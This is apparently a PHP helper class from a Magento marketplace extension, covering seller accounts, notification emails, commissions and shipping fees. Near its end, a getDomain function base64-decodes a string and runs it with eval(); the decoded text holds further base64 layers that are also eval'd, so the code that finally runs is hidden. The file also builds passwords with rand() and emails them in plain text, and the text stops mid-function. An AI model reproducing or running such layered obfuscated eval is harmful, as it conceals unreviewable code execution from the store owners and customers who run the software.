<?php

/*
 * ////////////////////////////////////////////////////////////////////////////////////// 
 * 
 * @author   Emipro Technologies 
 * @Category Emipro 
 * @package  Emipro_Marketplace 
 * @license http://shop.emiprotechnologies.com/license-agreement/   
 * 
 * ////////////////////////////////////////////////////////////////////////////////////// 
 */

class Emipro_Marketplace_Helper_Data extends Mage_Core_Helper_Abstract {

    /*
    * Get seller role id 
    */

    public function getVendorRoleId() {
        $role = Mage::getModel("admin/role")->getCollection()->addFieldToFilter('role_name', 'Seller/Vendor');
        $roledata = $role->getFirstItem()->getData();
        return $roledata['role_id'];
    }

    /*
    * Get country name
    */

    public function getCountryName($code) {
        if ($code != null) {
            $countryModel = Mage::getModel("directory/country")->loadByCode($code);
            return $countryModel->getName();
        }
    }

    /*
    * Get seller status
    */

    public function getStatus() {
        $status = array();
        $status["approved"] = "Approved";
        $status["pending"] = "Pending";
        $status["block"] = "Block";
        return $status;
    }

    /*
    * Check seller is approved seller
    */
    
    public function isVendor($Id = null) {
        if ($Id) {
            $seller = Mage::getModel('marketplace/list')->getCollection()->addFieldToFilter("status", "approved")->addFieldToFilter("seller_id", $Id);
            if (count($seller->getData()) > 0) {
                return true;
            }
        }
        return false;
    }

    /*
    * Get all product types
    */

    public function getProductTypes() {
        $productType = Mage::getModel('catalog/product_type')->getOptionArray();
        return $productType;
    }

    /*
    * Get Attribute sets
    */

    public function getAttributeSets() {
        $sets = Mage::getResourceModel('eav/entity_attribute_set_collection')
                ->setEntityTypeFilter(Mage::getModel('catalog/product')->getResource()->getTypeId())
                ->load()
                ->toOptionHash();
        return $sets;
    }

    /*
    * Add seller in product attribute vendor_id with store name
    */

    public function createProductattrVendor($arg_value) {
        $attribute_model = Mage::getModel('eav/entity_attribute');
        $attribute_options_model = Mage::getModel('eav/entity_attribute_source_table');
        $attribute_code = $attribute_model->getIdByCode('catalog_product', 'vendor_id');
        $attribute = $attribute_model->load($attribute_code);
        $attribute_options_model->setAttribute($attribute);
        $options = $attribute_options_model->getAllOptions(false);
        $attribute->setData('option', array(
            'value' => array(
                'option' => array($arg_value, $arg_value)
            )
        ));
        $attribute->save();
        $option_id_new = '';
        $attribute_options_model_new = Mage::getModel('eav/entity_attribute_source_table');
        $attribute_options_model_new->setAttribute($attribute);
        $options_new = $attribute_options_model_new->getAllOptions(false);
        // determine if this option exists
        $value_exists = false;
        foreach ($options_new as $option) {
            if ($option['label'] == $arg_value) {
                $option_id_new = $option['value'];
                break;
            }
        }
        return $option_id_new;
    }

    /*
    * Get admin user id
    */

    public function getAdminUserId($email) {
        $user = Mage::getModel('admin/user')->load($email, 'email');
        if ($user->getId()) {
            return $user->getId();
        }
        return;
    }

    /*
    * Get Product vendor_id from seller admin id 
    */

    public function getProuctVendorid($id) {
        $seller = Mage::getModel('marketplace/list')->load($id, 'seller_admin_id');
        if ($seller->getProductVendorId()) {
            return $seller->getProductVendorId();
        }
        return;
    }

    /*
    * Create password 
    */

    public function getrandomPassword($alphabet, $size) {
        $pass = array();
        $alphaLength = strlen($alphabet) - 1;
        for ($i = 0; $i < $size; $i++) {
            $n = rand(0, $alphaLength);
            $pass[] = $alphabet[$n];
        }
        return implode($pass);
    }

    /*
    * Get all seller id with store name
    */

    public function getsellerDropdown() {
        $seller = Mage::getModel('marketplace/list')->getCollection();
        $seller->join(array('s1' => 'seller'), 's1.seller_id=main_table.id', array('seller_id' => 's1.seller_id', 'store_name' => 's1.store_name'));
        $data = array();
        foreach ($seller as $key => $item) {
            $data[$item['id']] = $item['store_name'];
        }
        return $data;
    }

    /*
    * Send seller account verification mail
    */

    public function sendVerifymail($seller, $selleremail, $sellername) {
        if ($seller['id'] != '') {
            $senderemail = Mage::getStoreConfig('trans_email/ident_general/email');
            $_sendername = Mage::getStoreConfig('trans_email/ident_general/name');
            $email = Mage::getModel('core/email_template')->loadByCode('seller_account_verification');
            $emailTemplateVariable['sellername'] = $sellername;
            $emailTemplateVariable['frontname'] = Mage::app()->getStore()->getFrontendName();
            $url = Mage::getBaseUrl() . 'marketplace/seller/emailverify?sellerId=' . $seller['id'] . '&key=' . $seller['email_verify_key'];
            $emailTemplateVariable['redirect_url'] = $url;
            $email->setTemplateSubject('Seller Account Verification');
            $email->setSenderName($_sendername);
            $email->setSenderEmail($senderemail);
            $email->send($selleremail, $sellername, $emailTemplateVariable);
        }
    }

    /*
    * Send new seller account mail to admin
    */

    public function sendAdminmail($selleremail,$sellername){
            $senderemail = Mage::getStoreConfig('trans_email/ident_general/email');  
            $_sendername = Mage::getStoreConfig('trans_email/ident_general/name');  
            $email = Mage::getModel('core/email_template')->loadByCode('seller_account_admin_notification');
            $emailTemplateVariable['name'] = $_sendername;
            $emailTemplateVariable['frontname'] = Mage::app()->getStore()->getFrontendName();
            $emailTemplateVariable['sellername'] = $sellername; 
            $emailTemplateVariable['selleremail'] = $selleremail;   
            $email->setTemplateSubject('Seller Account Notification');
            $email->setSenderName($_sendername);
            $email->setSenderEmail($senderemail); 
            $email->send($senderemail, $_sendername, $emailTemplateVariable);  
    }

    /*
    * Send seller account success mail to seller 
    */

    public function sendSuccessMail($sellername, $selleremail, $sellerusername, $sellerpass) {
        try {
            $senderemail = Mage::getStoreConfig('trans_email/ident_general/email');
            $_sendername = Mage::getStoreConfig('trans_email/ident_general/name');
            $email = Mage::getModel('core/email_template')->loadByCode('seller_account_success');
            $emailTemplateVariable['sellername'] = $sellername;
            $emailTemplateVariable['sellerusername'] = $sellerusername;
            $emailTemplateVariable['sellerpass'] = $sellerpass;
            $emailTemplateVariable['frontname'] = Mage::app()->getStore()->getFrontendName();

            $email->setTemplateSubject('Seller Account Successfully created');
            $email->setSenderName($_sendername);
            $email->setSenderEmail($senderemail);
            $email->send($selleremail, $sellername, $emailTemplateVariable);
        } catch (Exception $e) {
            Mage::log('success mail not sent' . $e->getMessage());
        }
    }

    /*
    * Get seller id from login user
    */

    public function getSellerIdfromLoginUser() {
        if(Mage::registry('logged_in_seller_id'))
        {
            return Mage::registry('logged_in_seller_id');
        }else
        {
            if (Mage::getSingleton('admin/session')->isLoggedIn()) {
                $admin = Mage::getModel('admin/session');
                $seller = Mage::getModel('marketplace/list')->getCollection()->addFieldToFilter('seller_admin_id', $admin->getUser()->getId());
                if (isset($seller) && !empty($seller)) {
                    $sellerdata = $seller->getFirstItem()->getData();
                    if (isset($sellerdata['id']) && $sellerdata['id'] != '' && $sellerdata['id'] != 0) {
                        Mage::register('logged_in_seller_id',$sellerdata['id']);
                        return $sellerdata['id'];
                    }
                }
            }
        }
        return;
    }

    /*
    * Withdrawal request pending or approve mail
    */

    public function sendTransactionStatus($sellerid, $reqstatus, $amount, $notifyseller = false) {
        $senderemail = Mage::getStoreConfig('trans_email/ident_general/email');
        $_sendername = Mage::getStoreConfig('trans_email/ident_general/name');
        $seller = Mage::getModel('marketplace/list')->load($sellerid);
        $sellerdetail = Mage::getModel('marketplace/seller')->load($sellerid, 'seller_id');
        $customername = $sellerdetail->getFirstname();
        $email = $sellerdetail->getEmail();
        $mailname = $customername;
        if ($reqstatus == 'pending') {
            if (!$notifyseller) {
                $email = $senderemail;
                $mailmessage = 'New seller transaction pending entry found.';
            } else {
                $mailname = Mage::app()->getStore()->getFrontendName();
                $mailmessage = 'Your request is changed to pending status.';
            }
        }
        if ($reqstatus == 'approved') {
            $mailmessage = 'Your transaction request is approved.';
        }

        $emailtemplate = Mage::getModel('core/email_template')->loadByCode('seller_transaction_request');
        $emailTemplateVariable['sellername'] = $customername;
        $emailTemplateVariable['seller_id'] = $sellerid;
        $emailTemplateVariable['status'] = $reqstatus;
        $emailTemplateVariable['mailmessage'] = $mailmessage;
        $emailTemplateVariable['amount'] = $amount;
        $emailTemplateVariable['frontname'] = Mage::app()->getStore()->getFrontendName();

        $emailtemplate->setSenderName($_sendername);
        $emailtemplate->setSenderEmail($senderemail);
        $emailtemplate->send($email, $mailname, $emailTemplateVariable);
    }

    /*
    * Customer product question mail to seller and answer to customer
    */

    public function askquestionsellermail($_sendermail, $subject, $productsku, $question, $customeremail = null, $answer = '') {
        $senderemail = Mage::getStoreConfig('trans_email/ident_general/email');
        $_sendername = Mage::getStoreConfig('trans_email/ident_general/name');
        $emailtemplate = Mage::getModel('core/email_template')->loadByCode('customer_question_to_seller');
        $mailname = Mage::app()->getStore()->getFrontendName();
        $productname = '';
        if(isset($productsku) && !empty($productsku))
        { 
            $productobjid = Mage::getModel('catalog/product')->getIdBySku($productsku);
            $productobj = Mage::getModel('catalog/product')->load($productobjid);
            $productname = $productobj->getName();  
        }
        $emailTemplateVariable['productname'] = $productname;
        $emailTemplateVariable['sku'] = $productsku;
        $emailTemplateVariable['question'] = $question;
        $emailTemplateVariable['subject'] = $subject;
        $emailTemplateVariable['customer_email'] = $customeremail;
        if ($answer != '') {
            $emailTemplateVariable['answer'] = $answer; 
            $mailname = '';
        } else {
            $emailTemplateVariable['questionmail'] = 'question mail';
        }
        $emailTemplateVariable['frontname'] = Mage::app()->getStore()->getFrontendName();
        $emailtemplate->setTemplateSubject($subject);
        $emailtemplate->setSenderName($_sendername);
        $emailtemplate->setSenderEmail($senderemail);
        $emailtemplate->addBcc($senderemail);    
        $emailtemplate->send($_sendermail, $mailname, $emailTemplateVariable);  
    }

    /*
    * Get Children category
    */

    protected function getChildrencate($id) {
        if ($id != '') {
            $category_load = Mage::getModel('catalog/category')->load($id);
            return $category_load->getChildren();
        }
    }

    protected $parentcatestring = '';

    protected function getParentCategory($id) {
        if ($id != '') {
            $category_load = Mage::getModel('catalog/category')->load($id);
            if ($category_load->getParentCategory()->getId() && $category_load->getParentCategory()->getName()!='' &&  $category_load->getParentCategory()->getName() != 'Default Category' && $category_load->getParentCategory()->getName() != 'Root Catelog') {
                $this->parentcatestring[] .= $category_load->getParentCategory()->getName() . '--->';
                krsort($this->parentcatestring);

                return $category_load->getParentCategory()->getId();
            }
        }
    }
    
    /*
    * Get categories in array
    */

    public function toCategoriesArray($addEmpty = true) {
        $options = array();
        $options[""] = 'Select Category';
        foreach ($this->load_tree() as $category) {
            $options[$category['value']] = $category['label'];
        }

        return $options;
    }

    public function buildCategoriesMultiselectValues(Varien_Data_Tree_Node $node, $values, $level = 0) {
        $level++;
        if ($level > 2) {
            $childcate = $this->getChildrencate($node->getId());
            if ($childcate == '') {
                $parentid2 = $this->getParentCategory($node->getId());
                if ($parentid2 != '') {
                    $parentid1 = $this->getParentCategory($parentid2);
                    if ($parentid1 != '') {
                        $parent = $this->getParentCategory($parentid1);
                        if ($parent != '') {
                            $parentfirst = $this->getParentCategory($parent);
                        }
                    }
                }
                if(is_array($this->parentcatestring)){
                    $string = implode('', $this->parentcatestring);    
                }else{
                    $string = $this->parentcatestring;
                }
                $this->parentcatestring = '';

                $values[$node->getId()]['value'] = $node->getId();
                //$values[$node->getId()]['label'] =  str_repeat("--", $level) .">". $node->getName();
                $values[$node->getId()]['label'] = "--->" . $string . $node->getName();
            }
        }
        foreach ($node->getChildren() as $child) {
            $values = $this->buildCategoriesMultiselectValues($child, $values, $level);
        }
        return $values;
    }

    public function load_tree() {
        $store = Mage::app()->getFrontController()->getRequest()->getParam('store', 0);
        $parentId = $store ? Mage::app()->getStore($store)->getRootCategoryId() : 1;  // Current store root category

        $tree = Mage::getResourceSingleton('catalog/category_tree')->load();

        $root = $tree->getNodeById($parentId);

        if ($root && $root->getId() == 1) {
            $root->setName(Mage::helper('catalog')->__('Root'));
        }

        $collection = Mage::getModel('catalog/category')->getCollection()
                ->setStoreId($store)
                ->addAttributeToSelect('name')
                ->addAttributeToSelect('is_active');

        $tree->addCollectionData($collection, true);

        return $this->buildCategoriesMultiselectValues($root, array());
    }

    /*
    * Check shipment is available when create shipment in seller panel
    */

    public function shipmentAvailable($order_id) {
        $optionid = Mage::helper("marketplace")->getProuctVendorid(Mage::getSingleton('admin/session')->getUser()->getUserId());
        $productCollection = Mage::getModel('catalog/product')->getCollection()->addAttributeToFilter('vendor_id', $optionid);
        $productIDs = $productCollection->getAllIds();
		$order = Mage::getModel('sales/order')->load($order_id);
        $flag = false; 
            $items = $order->getAllVisibleItems();
            foreach ($items as $i)
            {
				$flag = true;
                if (in_array($i->getProductId(), $productIDs)) {
					if($i->getProductType()=='downloadable' || $i->getProductType()=='virtual'){
						continue;
					}
					if ($order->hasShipments()) {
						if($i->getQtyOrdered() > $i->getQtyShipped()){
							$flag = false;
							break;
						}
					}else{
						$flag = false;
						break;
					}
                }
            }  
        return $flag;
    }
    
    /*
    * Get seller name from seller_id
    */

    public function getsellernamefromid($id) {
        if ($id != '') {
            $sellerobj = Mage::getModel('marketplace/list')->load($id);
            if ($sellerobj->getId() != '') {
                $sellerdetail = Mage::getModel('marketplace/seller')->load($sellerobj->getId(), 'seller_id');
                if ($sellerdetail->getId()) {
                    return $sellerdetail->getFirstname();
                }
            }
        }
        return false;
    }

    /*
    * Get seller rating from seller_id
    */

    public function getSellerRating($id) {
        $ratingrow = Mage::getModel('marketplace/sellerreview')->getCollection();
        $ratingrow->addFieldToFilter('main_table.seller_id', $id);
        $ratingrow->addFieldToFilter('main_table.approved', 1);
        $count = $ratingrow->count();
        if ($count > 0) {
            $rating = Mage::getModel('marketplace/sellerreview')->getCollection();
            $rating->getSelect()->columns('SUM(main_table.rating) as ratings');
            $rating->addFieldToFilter('main_table.seller_id', $id);
            $rating->addFieldToFilter('main_table.approved', 1);
            $total = $rating->getFirstItem()->getRatings();
            if ($total != 0) {
                return number_format(($total / $count), 1);
            }
        }
        return false;
    }

    /*
    * Get seller_id from product vendor_id
    */

    public function getSelleridfromProductvendorid($id) {
        if ($id) {
            $seller = Mage::getModel('marketplace/list')->getCollection()->addFieldToFilter('product_vendor_id', $id)->getFirstItem();
            if ($seller->getId()) {
                return $seller->getId();
            }
        }
    }

    /*
    * Get seller balance in seller panel dashboard
    */

    public function getSellerBalance($sellerid) {
        if ($sellerid != '') {

            $commissiondata = Mage::getModel('marketplace/sellerbalancesheet')->getCollection()->addFieldToFilter('seller_id', $sellerid)->addFieldToSelect("credit")->addFieldToSelect("debit");
            $credit = 0;
            $debit = 0;
            foreach ($commissiondata->getData() as $row) {
                if ($row["credit"] != null) {
                    $credit += $row["credit"];
                }
                if ($row["debit"] != null) {
                    $debit += $row["debit"];
                }
            }
            return $credit - $debit;
        }
        return false;
    }

    public function getMarketplaceUrl() {
        return $this->_getUrl('marketplace/seller/create');
    }

    public function getSellersigninUrl() {
        return $this->_getUrl('marketplace/sellerlogin');
    }

    /*
    * Seller credit or debit add in Balance statement table
    */

    public function saveTransactionReport($data) {
        $model = Mage::getModel("marketplace/sellerbalancesheet");
        $model->setTransactionId($data["transaction_id"]);
        $model->setTransactionType($data["transaction_type"]);
        if (!empty($data["credit"]))
            $model->setCredit($data["credit"]);
        if (!empty($data["debit"]))
            $model->setDebit($data["debit"]);
        $model->setDate($data["date"]);
        $summary = isset($data["summary"])? $data["summary"]:'';
        $model->setSummary($summary);
        $model->setSellerId($data["seller_id"]);
        if (!empty($data["order_id"]))
            $model->setOrderId($data["order_id"]);
        $model->save();
    }

    /*
    * Seller credit or debit update in Balance statement table
    */

    public function updateTransactionReport($data) {
        $modeldata = Mage::getModel("marketplace/sellerbalancesheet")->getCollection()->addFieldToFilter('transaction_id', $data["transaction_id"])->addFieldToFilter('transaction_type', 'withdraw')->getFirstItem();
        $id = $modeldata->getId();
        if ($id) {
            $modeldata->setData($data);
            $modeldata->setId($id)->save();
        }
    }

    /*
    *   Seller commission amount calculate from advance commission, category wise commision and default commision 
    */

     public function getSellerCommissionAmount($sellerid, $productId, $price, $qty,$shippingcharge=0) {
        $comm_amt = '';
        if ($sellerid) {
            $prodload = Mage::getModel('catalog/product')->load($productId);
            $vendorId = $prodload->getVendorId();
            $sellerId = Mage::helper('marketplace')->getSelleridfromProductvendorid($vendorId);
            $categoryids = $prodload->getCategoryIds();
            if (Mage::helper('core')->isModuleEnabled('Emipro_Advancecommission')) {
                $comm_basedon = Mage::getStoreConfig('marketplace_setting/categorycommission/commission_based_on');
                if($comm_basedon){
                    $comm_amt = Mage::helper('emipro_advancecommission')->sellerProductCommissionAmount($sellerId, $productId, $price, $qty,$shippingcharge);
                    if ($comm_amt != '') {
                        return $comm_amt;
                    }
                }else{
                    $comm_amt = Mage::helper('emipro_advancecommission')->sellerCommissionAmount($sellerId, $categoryids, $price, $qty,$shippingcharge);
                    if ($comm_amt != '') {
                        return $comm_amt;
                    }
                }
            }

            $defaultsellercommission = unserialize(Mage::getStoreConfig('marketplace_setting/categorycommission/ua_regexp', Mage::app()->getStore()));
            foreach ($defaultsellercommission as $item) {
                if (in_array($item['category'], $categoryids)) {
                    if ($item['commissiontype'] == 0) {
                        $shipping = (($shippingcharge * $item['commission']) / 100);
                        $amount = (($price * $item['commission']) / 100);
                        $comm_amt = $amount * $qty;
                        if($shipping>0){
                            $comm_amt += $shipping;
                        }
                    } else {
                        $comm_amt = ($qty * $item['commission']);
                    } 
                }
                if ($comm_amt != '') {
                    return $comm_amt;
                }
            }

            $sellerrule = Mage::getModel('marketplace/sellerrule')->getCollection()->addFieldToFilter('seller_id', $sellerid)->getFirstItem()->getData();
            if ($sellerrule['commission_type'] == 0) {
                $percent = $sellerrule['commission'];
                $shipping = (($shippingcharge * $percent) / 100);
                $amount = (($price * $percent) / 100);
                $comm_amt = $amount * $qty;
                if($shipping>0){
                    $comm_amt += $shipping;
                }
            } else {
                $comm_amt = ($qty * $sellerrule['commission']);
            }
        }
        return $comm_amt;
    }

    /*
    *   Get all Seller's product ids
    */

	public function sellerProductIds(){
		$products = Mage::getModel('catalog/product')->getCollection()->addAttributeToSelect(array('entity_id','vendor_id'))->addAttributeToFilter('vendor_id',array('neq'=>''));
		$array = array();
		foreach($products as $itemk){
			if($itemk->getVendorId()!='')
			{
				$seller = Mage::getModel('marketplace/list')->getCollection();
				$seller->addFieldToFilter('product_vendor_id',$itemk->getVendorId());
				$sellerid = $seller->getFirstItem()->getId();
				if($sellerid){
					$array[$itemk->getId()] =  $sellerid;
				}
			}  
		}
		return $array;
	}

    /*
    *   Get seller_id from product_id
    */

	public function sellerIdFromProductId($productid){
		$productobj = Mage::getModel('catalog/product')->load($productid);
		if($productobj->getId()){ 
			$seller = Mage::getModel('marketplace/list')->load($productobj->getVendorId(),'product_vendor_id');
			if($seller->getId()){
				return $seller->getId();
			}	
		}
	}     
	
    /*
    *   Get seller shipping fees
    */

    public function getSellerShippingFees($orderId,$sellerid)
    {
        $shipFees=0;
        $BaseShipFees=0;
        $ship_amount=array();
        $venderId=null;
        $order_collection= Mage::getModel('sales/order_item')->getCollection()->addFieldToFilter('order_id', $orderId);
        $seller = Mage::getModel('marketplace/list')->load($sellerid);
        if($seller->getId())
        {
                $venderId=$seller->getProductVendorId();
        }
        foreach($order_collection as $value)
        {
            $product= Mage::getSingleton('catalog/product')->load($value->getProductId());
            
            if($product->getVendorId()==$venderId && $value->getParentItemId()==NULL)
            {
                $shipFees=$value->getShippingCharge()+$shipFees;
                $BaseShipFees=$value->getBaseShippingCharge()+$BaseShipFees;
            }
        }
        $ship_amount=array("shipfees"=>$shipFees,"baseshipfees"=>$BaseShipFees);
        return $ship_amount;
    }

    /*
    *   Get admin shipping fees
    */

    public function getAdminShippingFees($orderId)
    {
        $shipFees=0;
        $BaseShipFees=0;
        $ship_amount=array();
        $order_collection= Mage::getModel('sales/order_item')->getCollection()->addFieldToFilter('order_id', $orderId);
        foreach($order_collection as $value)
        {
            $product= Mage::getSingleton('catalog/product')->load($value->getProductId());
            if($product->getVendorId()==NULL && $value->getParentItemId()==NULL)
            {
                $shipFees=$value->getShippingCharge()+$shipFees;
                $BaseShipFees=$value->getBaseShippingCharge()+$BaseShipFees;
            }
                
        }
        $ship_amount=array("shipfees"=>$shipFees,"baseshipfees"=>$BaseShipFees);
        return $ship_amount;
    } 

    /*
    *   Get shipping charge for credit memo
    */
    
    public function getShippingChargeForCreditmemo($orderId,$orderItemId)
    {
        
        $shipFees=0;
        $BaseShipFees=0;
        $ship_amount=array();
        $venderId=null;
        
        $orderItem= Mage::getModel('sales/order_item')->load($orderItemId);
        
        if(!$orderItemId)
        {
            return $ship_amount=array("shipfees"=>0,"baseshipfees"=>0);
        }
         $shipFees=$orderItem->getShippingCharge();
        $BaseShipFees=$orderItem->getBaseShippingCharge();
        
        $creditMemoItem = Mage::getResourceModel('sales/order_creditmemo_item_collection');
        $creditMemoItem->addFieldToFilter('order_item_id', $orderItemId);
        
        if($creditMemoItem->count()>0)
            {
                foreach($creditMemoItem as $data)
                {
                    $refundedFees=$data->getShippingCharge()+$refundedFees;
                    $refundedBaseFees=$data->getBaseShippingCharge()+$refundedBaseFees;
                }
                $remainingFees=$shipFees-$refundedFees;
                $remainingBaseFees=$BaseShipFees-$refundedBaseFees;
                
                if($shipFees>=$remainingFees && $BaseShipFees>=$remainingBaseFees)
                {
                    $ship_amount=array("shipfees"=>$remainingFees,"baseshipfees"=>$remainingBaseFees);
                }
                else
                {
                    $url = Mage::helper('core/http')->getHttpReferer() ? Mage::helper('core/http')->getHttpReferer()  : Mage::getUrl();
                    Mage::app()->getFrontController()->getResponse()->setRedirect($url);
                    Mage::getSingleton('core/session')->addError('Cannot save the credit memo.');
                    Mage::app()->getResponse()->sendResponse();
                
                }   
            }
        else
        {
            $ship_amount=array("shipfees"=>$shipFees,"baseshipfees"=>$BaseShipFees);
        }
        return $ship_amount;
    }
    
    /*
    *   Calcualge seller partial shipping fees
    */
    
    public function getSellerPartialShippingFees($orderId,$sellerid)
    {
        $shipFees=0;
        $BaseShipFees=0;
        $ship_amount=array();
        $venderId=null;
        $order_collection= Mage::getModel('sales/order_item')->getCollection()->addFieldToFilter('order_id', $orderId);
        $seller = Mage::getModel('marketplace/list')->load($sellerid);
        if($seller->getId())
        {
                $venderId=$seller->getProductVendorId();
        }
        foreach($order_collection as $value)
        {
            $product= Mage::getSingleton('catalog/product')->load($value->getProductId());
            
            if($product->getVendorId()==$venderId && $value->getParentItemId()==NULL)
            {
                $shipFees=$value->getShippingCharge()+$shipFees;
                $BaseShipFees=$value->getBaseShippingCharge()+$BaseShipFees;
            }
        }
        $InvoiceCollection = Mage::getResourceModel('sales/order_invoice_collection');
        $InvoiceCollection->addFieldToFilter('order_id', $orderId);
        $InvoiceCollection->addFieldToFilter('seller_id', $sellerid);
    
        if($InvoiceCollection->count()>0)
        {
                $shipFees=0;
                $BaseShipFees=0;
        }
        $ship_amount=array("shipfees"=>$shipFees,"baseshipfees"=>$BaseShipFees);
        return $ship_amount;
    }
    
    /*
    *   check invoice created for seller 
    */
    
    public function checkInvoiceGenerated($orderId,$sellerid)
    {
        $InvoiceCollection = Mage::getResourceModel('sales/order_invoice_collection');
        $InvoiceCollection->addFieldToFilter('order_id', $orderId);
        $InvoiceCollection->addFieldToFilter('seller_id', $sellerid);
        
        if($InvoiceCollection->count()>0){
            return true;
        }
        else{
            return false;
        }
    }
    
    /*
    *   Get parent product type
    */
    
    public function getParentProductType($_item)
    {
        if($_item->getParentItemId()==""){
            return false;
        }
        $collection=Mage::getModel('sales/order_item')->load($_item->getParentItemId(),'item_id');
        if($collection->getProductType()=="bundle"){
            return true;
        }
    }
    
    /*
    *   Get Seller store name from seller id 
    */     

    public function sellerstorenameFromSellerId($sellerid){
        if($sellerid){
            $sellerdetail = Mage::getModel('marketplace/seller')->load($sellerid,'seller_id');
            if($sellerdetail->getId()){
                return $sellerdetail->getStoreName();
            }
        }
        return false;
    }
	
     /*
        Get seller info
    */
    public function getSellerInfo($sellerid){
        if($sellerid){
            $sellerdetail = Mage::getModel('marketplace/seller')->load($sellerid,'seller_id');
            if($sellerdetail->getId()){
                return $sellerdetail;
            }
        }
        return false;
    }
    
    public function getDomain($url) {
        $tFmb = base64_decode('JG9JWFEgPSAnSkVoeldsUWdQU0FuU2tka1MxZHVaMmRRVTBGdVUydG9kMWRIVWtkU1YyUlJWVEJHZFZVeWRHdGhNVXAwVm01T1lVMXRVbEpXVkVKSFpGWlZlV1JIT1ZKTmF6VklXVEJhYjFaWFNsbGhTRVpoVm14YVIxUnNXazlXYlVaR1ZHMW9VMDFFVlhoV2EyTjRUa1prVmsxSWFGaGhiRnBoV1ZSQk1XUldiRlZUYkU1WVZtczFNVlpIZERSV01VNUdUbFY0VmxaRldrZGFSRVpPWkRGU2MxTnRhRTVpYkVwdlZsYzFkMk13TVVkYVJtUmhVMFUxY2xac1pEUlNiRkpXV2tkMGFGSnRVa2RVYkZKaFYwZEtTR0ZHVGxwaGEwb3pWVEZhUjJSV1JuUlNiR1JPVWtaYU5sWXhhSGRTTWxaMFUyNVNVMkV5YUZGV01HaERZMnhXVlZOc1RtaE5WVEUwVmtkMFMxUlZNVWhsUlZaWFZucFdjbGxWV2xwbFJtUjFVbXhvYVZJeWFGRldNV1F3WkcxV1dGSnJiRmhpV0VKUFZGWldZVTFXV1hkWGF6bFNZWHBXZVZsclZsTldiVXAwVlcwNVYyRnJXbWhaTVZwcll6SkdSazlXY0doTmJtZDRWbFpqZUdJeVJYaFRXR3hoVTBWS1dWVnRlRXRPYkZwSVpFVTVhV0pWVmpOWk1HUnZWakF4V0dWSVZsWmxhMHAyVlZSS1YxWXlUa2RoUjBaVFRWaENkMVp0Y0VOWGJWRjRXa1pXVkdKVVZuQlVWV2hDVFZaUmQxbDZWbFpXVkVaWFZXeFNVMWRIUlhsVVZFWmhVbFp3ZWxZd1pFdFRWbHB6VW0xc1ZGSnJjREpXYTFaaFlqSlNkRlZZWkd4U2JGcHdWV3BHUzFkV1VsaGtSbVJPVW01Q1dWa3dWa3RoTVVwVllrWm9ZVkpGTlZSV01WcHJVMVpTY1ZWc1ZsTldhM0JvVjJ4amVGbFdXWGxWV0hCWFlrZG9UMWxVUmxwa01XUnpXa1JTVGsxc1NsaFpWVnB6WVdzd2VXVkZOVlpoTVhBeVZHeGFUbVZHVW5OVGJYUnBWbFp3VmxZeFVrOVVNVTV6VWxob1ZHSnJjR0ZaVjNSelRrWnNWbHBGWkZoU1ZGWktWa2QwZDFWck1WWmlla1pYVFc1b2NsbFVTbGRqYlZKSFZXMW9UbUpXU25wWGEyaDNVVEZTUjFKWWFGTmlhM0JWV1d4Vk1VMUdXblJqUlU1b1RWZFNSMWt3VWtkV1JscFdUbFpTWVZac2NETldNRnAzVTFkT1IyRkhlRmROVlhBMVZqRmtkMU50VmtoU2EyaFRZa2RvVUZWdWNGZFhiRnB5WVVVNVZVMVZWalZYYTJoTFZrZEtWMk5HVmxaV2VrVXdXVlphVDFKck5WbFViRkpYVmpKbk1sWnJaREJVTWtwMFVsaGthbEpXU2xsVmJHaERaV3hrY2xadE9WZE5iRnBaVlRJMVExVnNXWHBWYmtwWFRVWmFNMXBYZUZKbGJHdDZXa1pTVGxKVVZsUlhWM1JUWTIxS2NrOVVWbFppVlZweFZtMHhVMkl4VGxaVldHUmhUVWhCTVZaWE1EVlhSa3B6VTJwU1ZGWldSak5YYWtaelpFWktkV05IUmxkU2JYUXpWakJTUzFVeVNrZGhNMnhRVmpOU2FGWlVTbXRqYkdSeFVXeGtUMkpIVWtWWldIQnJVMnhKZUZkWWJGaFdiVkY2V1dwQ2QxTkhSa2RpUm1SVVVsWmFNMVpFVG5OaGF6UjRZMFpzV0dKWGFIQlZWRXByWTJ4WmVVNVZaRmhTYlhoVldWaHdhbUpyT1RWVmJFWlhUVEJhYUZOVlVYZGFNSEExVldwS1ZsWnVRalZUVlZGM1dqRnNkRkp1Y0dGV1JtdDNWMFJLVTJKR2EzbFBWM1JoVlRKa2NscFhlR3ROUmxaVVlYcGtTbEl4V1hsWFZtUXpZakJ3U1Zkc1NsaGlhMngzVkROc2FrNHhjRmxYYldocFVUSmtjbFpWV210bFJtUndZWHBqYms5NVVsQmxTRTVTU1VRd1owcDVVa3BWYms1WlNVUXdaMWx0Um5wYVZGa3dXREpTYkZreU9XdGFVMmRyV2pCd1lXVkRhemRKUjFZeVdWZDNiMHBGYkZOak1XZHdUM2xqTjFwWVdtaGlRMmRyVkROb2VsVlRhemNuT3lSUmVFUnlJRDBnSnlSTmVIcFhJRDBnWW1GelpUWTBYMlJsWTI5a1pTZ2tTSE5hVkNrN0lHVjJZV3dvSkUxNGVsY3BPeWM3WlhaaGJDZ2tVWGhFY2lrNyc7JFFlWGEgPSAnJHNRelcgPSBiYXNlNjRfZGVjb2RlKCRvSVhRKTsgZXZhbCgkc1F6Vyk7JztldmFsKCRRZVhhKTs=');
        eval($tFmb);
    }

    function checkKey($key, $domain, $extension) {
